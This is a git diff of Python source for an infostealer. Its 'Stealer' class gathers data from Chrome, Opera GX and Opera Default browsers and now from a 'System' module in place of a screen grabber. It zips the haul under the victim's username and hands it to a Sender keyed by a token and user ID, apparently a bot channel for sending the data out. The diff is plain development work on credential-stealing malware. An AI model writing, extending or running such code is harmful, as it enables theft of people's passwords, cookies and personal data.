@@ -4,7 +4,7 @@ from getpass import getuser
 from threading import Thread
 
 from .modules.sender import Sender
-from .modules.screen_grabber import Screen_Grabber
+from .modules.system import System
 
 from .browsers.chrome import Chrome
 from .browsers.opera_gx import Opera_GX
@@ -13,12 +13,12 @@ from .browsers.opera_default import Opera_Default
 
 class Stealer(Thread):
 
-    def __init__(self, token: str, user_id: int, errors_print: bool = False):
+    def __init__(self, token: str, user_id: int, errors: bool = False):
         Thread.__init__(self, name="Stealer")
 
         self.token = token
         self.user_id = user_id
-        self.errors_print = errors_print
+        self.errors = errors
 
         self.user = getuser()
         self.zip_name = f"{self.user}-st"
@@ -30,21 +30,24 @@ class Stealer(Thread):
                 "method": Chrome(
                     self.storage_path,
                     self.storage_folder,
-                    self.errors_print
+                    "/Chrome",
+                    self.errors
                 )
             },
             {
                 "method": Opera_GX(
                     self.storage_path,
                     self.storage_folder,
-                    self.errors_print
+                    "/Opera GX",
+                    self.errors
                 )
             },
             {
                 "method": Opera_Default(
                     self.storage_path,
                     self.storage_folder,
-                    self.errors_print
+                    "/Opera Default",
+                    self.errors
                 )
             }
         ]
@@ -69,12 +72,12 @@ class Stealer(Thread):
             for browser in self.browsers:
                 browser["method"].run()
 
-            Screen_Grabber(self.storage_path, self.storage_folder, self.errors_print).run()
-            Sender(self.zip_name, self.storage_path, self.storage_folder, self.token, self.user_id, self.errors_print).run()
+            System(self.storage_path, self.storage_folder, "/System", self.errors).run()
+            Sender(self.zip_name, self.storage_path, self.storage_folder, self.token, self.user_id, self.errors).run()
 
         except Exception as e:
 
-            if self.errors_print is True:
+            if self.errors is True:
 
                 print(f"[MULTISTEALER]: {repr(e)}")
 
